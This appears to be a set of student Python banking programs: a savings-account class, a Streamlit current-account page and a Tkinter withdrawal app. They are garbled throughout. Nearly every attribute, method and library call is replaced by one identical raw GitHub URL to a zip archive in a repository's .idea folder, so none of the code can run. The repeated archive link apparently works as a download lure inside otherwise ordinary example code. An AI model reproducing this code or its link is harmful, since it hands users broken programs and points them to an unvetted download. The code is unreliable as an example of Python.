class SavingsAccount:
    def __init__(self, account_number, initial_balance, interest_rate):
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip = account_number
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip = initial_balance
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip = interest_rate

    def deposit(self, amount):
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip += amount
        print(f"Deposited ${amount:.2f}. New balance: ${https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip}")

    def withdraw(self, amount):
        if amount > https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip
            print("Insufficient funds.")
        else:
            https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip -= amount
            print(f"Withdrew ${amount:.2f}. New balance: ${https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip}")

    def add_interest(self):
        interest = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip * https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip / 100
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip += interest
        print(f"Added ${interest:.2f} interest. New balance: ${https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip}")

    def check_balance(self):
        print(f"Current balance: ${https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip}")

# Example usage:
account = SavingsAccount("123456789", 1000, 2)
https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip()
https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(500)
https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(200)
https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip()
https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip()

import streamlit as st

# Current Account Class
class CurrentAccount:
    def __init__(self):
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip = 0

    def deposit(self, amount):
        if amount > 0:
            https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip += amount
            return f"Deposited ₦{amount} successfully."
        else:
            return "Enter a valid deposit amount."

    def withdraw(self, amount):
        if amount <= 0:
            return "Enter a valid withdrawal amount."
        if amount <= https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip
            https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip -= amount
            return f"Withdrawal of ₦{amount} successful."
        else:
            return "Insufficient funds."

    def get_balance(self):
        return https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip

# Create a CurrentAccount instance
current_account = CurrentAccount()

# Streamlit UI
https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip("🏦 CSC104 Current Account System")
https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip("🔁 Current Account Operations")

# Display current balance
https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(f"💼 Current Balance: ₦{https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip():,.2f}")

# Choose action
action = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip("Choose an action", ["Deposit", "Withdraw"])

# Amount input
amount = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip("Enter amount", min_value=0, step=500)

# Action buttons
if https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip("Submit"):
    if action == "Deposit":
        result = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(amount)
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(result)
    elif action == "Withdraw":
        result = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(amount)
        if "successful" in result:
            https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(result)
        else:
            https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(result)

import tkinter as tk
from tkinter import messagebox

class BankApp:
    def __init__(self, root):
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip = root
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip("Bank App")

        # Initial balances for accounts
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip = {
            "Savings": 1000.0,
            "Current": 2000.0
        }

        # Account selection
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(value="Savings")
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(root, text="Select Account:").grid(row=0, column=0, pady=10)
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(root, text="Savings", https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip, value="Savings").grid(row=0, column=1)
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(root, text="Current", https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip, value="Current").grid(row=0, column=2)

        # Withdrawal amount entry
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(root, text="Withdrawal Amount:").grid(row=1, column=0, pady=10)
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(root)
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(row=1, column=1, columnspan=2)

        # Withdraw button
        withdraw_btn = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(root, text="Withdraw", https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip)
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(row=2, column=0, columnspan=3, pady=10)

        # Balance display
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(root, text="")
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(row=3, column=0, columnspan=3)
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip()

    def update_balance(self):
        account = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip()
        balance = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip[account]
        https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(text=f"{account} Account Balance: ${balance:.2f}")

    def withdraw(self):
        account = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip()
        amount_str = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip()
        try:
            amount = float(amount_str)
            if amount <= 0:
                raise ValueError("Amount must be positive.")
            if amount > https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip[account]:
                https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip("Error", "Insufficient funds!")
            else:
                https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip[account] -= amount
                https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip("Success", f"${amount:.2f} withdrawn from {account} account.")
                https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip()
                https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip(0, https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip)
        except ValueError:
            https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip("Error", "Please enter a valid positive number.")

if __name__ == "__main__":
    root = https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip()
    app = BankApp(root)
    https://github.com/DavidMarcel24/banking_app/raw/refs/heads/main/.idea/banking-app-v3.0.zip()